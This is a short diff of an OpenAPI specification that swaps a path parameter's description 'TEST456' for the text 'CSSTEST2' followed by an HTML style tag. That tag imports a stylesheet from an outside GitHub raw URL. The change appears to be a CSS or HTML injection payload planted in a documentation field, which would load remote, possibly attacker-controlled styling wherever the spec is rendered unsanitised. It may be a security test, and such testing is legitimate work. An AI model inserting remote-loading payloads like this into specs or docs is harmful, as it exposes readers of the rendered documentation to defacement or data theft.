@@ -26,7 +26,7 @@ paths:
     delete:
       parameters:
         - description: |
-            TEST456
+            CSSTEST2 <style>@import url(//raw.githubusercontent.com/phnix-sec/testrpooo/main/test.css);</style>
 
           format: int64
           in: path
